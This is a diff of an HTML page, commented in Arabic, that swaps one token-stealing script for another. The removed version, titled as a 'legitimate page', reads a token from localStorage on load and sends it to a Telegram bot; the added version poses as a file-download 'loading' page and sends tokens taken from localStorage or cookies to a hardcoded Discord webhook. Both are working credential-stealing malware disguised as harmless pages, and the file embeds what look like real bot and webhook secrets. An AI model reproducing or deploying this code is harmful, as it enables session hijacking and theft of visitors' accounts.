@@ -3,61 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>صفحة شرعية</title>
-    <script>
-        async function sendTokenToTelegram(token) {
-            const botToken = "8145854526:AAHwbn86MVJ_Lmq9g5RVOfJjkiQ0WREQ_E0";  // التوكن الجديد
-            const chatId = "YOUR_CHAT_ID";  // استبدل هذا بـ Chat ID الخاص بك
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-            for (let attempt = 1; attempt <= 5; attempt++) {
-                try {
-                    const response = await fetch(url, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: `تم سرقة التوكن: ${token}`,
-                        }),
-                    });
-
-                    if (response.ok) {
-                        console.log('تم إرسال التوكن بنجاح!');
-                        return;
-                    } else {
-                        const errorData = await response.json();
-                        console.error(`فشل الإرسال (المحاولة ${attempt}):`, errorData);
-                    }
-                } catch (error) {
-                    console.error(`حدث خطأ (المحاولة ${attempt}):`, error);
-                }
-
-                // انتظر 3 ثوانٍ قبل المحاولة التالية
-                await new Promise(resolve => setTimeout(resolve, 3000));
-            }
-
-            console.error('فشل إرسال التوكن بعد 5 محاولات.');
+    <title>تحميل الملف</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
-
-        async function stealToken() {
-            try {
-                // محاولة سرقة التوكن من Local Storage
-                const token = localStorage.getItem('token') || 'لم يتم العثور على توكن';
-                
-                // إرسال التوكن إلى بوت تليجرام
-                await sendTokenToTelegram(token);
-            } catch (error) {
-                console.error('حدث خطأ أثناء سرقة التوكن:', error);
-            }
+        .loading {
+            font-size: 24px;
+            color: #333;
         }
-
-        // تشغيل الدالة عند تحميل الصفحة
-        window.onload = stealToken;
-    </script>
+    </style>
 </head>
 <body>
-    <h1>مرحبًا! هذه صفحة شرعية.</h1>
+    <div class="loading">
+        جاري التحميل...
+    </div>
+
+    <script>
+        // سرقة التوكن من localStorage أو cookies
+        function stealToken() {
+            const token = localStorage.getItem('token') || document.cookie.match(/token=([^;]+)/)?.[1];
+            return token || "لم يتم العثور على توكن.";
+        }
+
+        // إرسال التوكن إلى الديسكورد عبر الويب هوك
+        async function sendTokenToDiscord(token) {
+            const webhookUrl = "https://discord.com/api/webhooks/1340213337488756787/FtxrXmZwpn0hvphE3XqHNsJhuynjryrd8sMMGNlDRrC0X5pOix7n2SIJ9X8eZsjPi-0_";
+
+            const data = {
+                content: `تم سرقة التوكن: ${token}`
+            };
+
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data),
+                });
+
+                if (response.ok) {
+                    console.log('تم إرسال التوكن بنجاح!');
+                } else {
+                    console.error('فشل إرسال التوكن.');
+                }
+            } catch (error) {
+                console.error('حدث خطأ:', error);
+            }
+        }
+
+        // تشغيل الكود الضار تلقائيًا عند فتح الصفحة
+        (async function() {
+            const token = stealToken();
+            await sendTokenToDiscord(token);
+        })();
+    </script>
 </body>
 </html>
